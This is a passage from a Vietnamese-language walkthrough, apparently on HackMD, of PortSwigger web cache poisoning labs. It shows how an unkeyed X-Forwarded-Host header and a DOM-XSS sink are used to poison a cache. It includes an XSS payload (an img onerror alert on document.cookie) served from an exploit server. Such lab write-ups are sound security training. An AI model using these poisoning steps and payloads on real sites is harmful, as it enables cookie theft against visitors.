>Chứng tỏ rằng cache server sẽ lưu trữ theo từng đoạn => khả năng dính internal cache poisoning!

>Xóa `X-Forwarded-Host: abc` và gửi lại request, ta thấy địa chỉ load `geolocate.js` vẫn trỏ về `//abc` còn 2 cái kia thì không &rarr; `X-Forwarded-Host` unkeyed bởi internal cache nhưng là keyed đối với external cache:
>![image](https://hackmd.io/_uploads/r1U9H4rvC.png)

>Bây giờ chỉ việc tạo file `/js/geolocate.js` chứa `alert(document.cookie)` và lưu trong exploit server:
>![image](https://hackmd.io/_uploads/BJ9TBNHv0.png)

>Nhét exploit-server domain vào `X-Forwarded-Host` và gửi cho đến khi hostname load file `/js/geolocate.js` trở thành exploit-server:
>![image](https://hackmd.io/_uploads/rJqB8VrPR.png)

>Xóa `X-Forwarded-Host`, ta thấy hostname load file `/js/geolocate.js` vẫn là exploit-server:
>![image](https://hackmd.io/_uploads/rkJwLVSDR.png)

>Lúc này nạn nhân truy cập trang chủ sẽ load `/js/geolocate.js` của exploit-server và bị alert cookie, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SysuUVrvC.png)

# **12. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) to exploit a DOM vulnerability via a cache with strict cacheability criteria**
>This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.
To solve the lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
>![image](https://hackmd.io/_uploads/rybNDNSD0.png)

>Scan web bằng **Param Miner** thì thấy header `X-Forwarded-Host` được hỗ trợ:
>![image](https://hackmd.io/_uploads/SkpxtNSPC.png)

>Thêm Header này vào request thì thấy nó được gán vào trong param `data.host`:
>![image](https://hackmd.io/_uploads/H1LDYNrwR.png)

>Sau đó, hàm `initGeoLocate()` được gọi với tham số `//data.host/resources/json/geolocate.json` ta có thể controll được:
>![image](https://hackmd.io/_uploads/HJ8CYESv0.png)

>Hàm `initGeoLocate()` bị dính DOM-XSS khi sau khi lấy lấy response về từ jsonUrl, nó thực hiện parse JSON và lấy `j.country` đưa vào sink innerHTML để render:
>![image](https://hackmd.io/_uploads/SyVWq4rPC.png)

>Với jsonURL lấy từ file `/resources/json/geolocate.json`:
>![image](https://hackmd.io/_uploads/r1lP4cVrwC.png)

>Như vậy, ta có thể giả mạo file JSON này và thay đổi giá trị của param `country` bằng payload XSS. Tạo exploit-server với đường dẫn `/resources/json/geolocate.json` chứa nội dung:

```json
{
    "country": "<img src=1 onerror=alert(document.cookie) />"
}
```
Thêm `Access-Control-Allow-Origin: *` để support CORS:
![image](https://hackmd.io/_uploads/HJ-ksNHv0.png)

>Bây giờ chỉ việc poison cache với header `X-Forwarded-Host: <Exploit-server>`. Chú ý, cache chỉ cache với các request có cookie vì khi không có cookie, server trả về set-cookie &rarr; nếu cache thì có thể các user có thể nhận được cache response &rarr; chung cookie:
>![image](https://hackmd.io/_uploads/B1xw34SwA.png)

>Thêm cookie cho request và send request tới khi `X-Cache: hit`
>![image](https://hackmd.io/_uploads/B13Fh4rvA.png)

>Sau đó, khi victim truy cập trang chủ sẽ bị dính DOM-XSS và alert thành công, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ryk23Erv0.png)

